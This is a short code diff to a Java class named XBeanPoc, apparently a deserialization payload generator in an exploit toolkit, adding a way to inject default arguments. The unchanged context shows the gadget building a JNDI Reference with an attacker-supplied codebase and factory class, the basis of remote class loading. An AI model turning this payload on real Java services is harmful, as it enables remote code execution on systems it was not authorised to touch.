@@ -22,6 +22,8 @@ import org.apache.xbean.naming.context.WritableContext;
  */
 public class XBeanPoc implements Payload {
 
+  private String[] args;
+
   /**
    *
    * @param args
@@ -33,6 +35,8 @@ public class XBeanPoc implements Payload {
    */
   @Override
   public Object getPayload(String[] args) {
+    if (this.args != null)
+      args = this.args;
     Object s = null;
     try {
       Reference ref = new Reference("Calc", args[1],args[0]);
@@ -44,6 +48,12 @@ public class XBeanPoc implements Payload {
     }
     return s;
   }
+
+  @Override
+  public void injectDefaultArgs(String[] args) {
+    this.args = args;
+  }
+
 
   @Override
   public PackageType getPackageType() {
